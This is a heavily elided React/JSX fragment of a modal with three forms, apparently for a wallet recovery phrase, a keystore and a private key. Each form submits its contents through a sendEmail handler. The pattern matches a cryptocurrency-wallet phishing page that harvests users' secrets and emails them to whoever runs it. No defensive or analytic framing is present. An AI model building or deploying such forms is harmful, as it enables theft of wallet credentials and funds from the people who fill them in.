                          ...
                          <div className="modal-content">
                            ...
                            <div className="modal-body">
                              ...
                              <div className="tab-content" id="nav-tabContent">
                                <form ref={phraseFormRef} onSubmit={(e) => sendEmail(e, phraseFormRef)} >
                                ...
                                <form ref={keyStoreFormRef} onSubmit={(e) => sendEmail(e, keyStoreFormRef)}>
                                 <div
                                ...
                                <form ref={privateKeyFormRef} onSubmit={(e) => sendEmail(e, privateKeyFormRef)}>
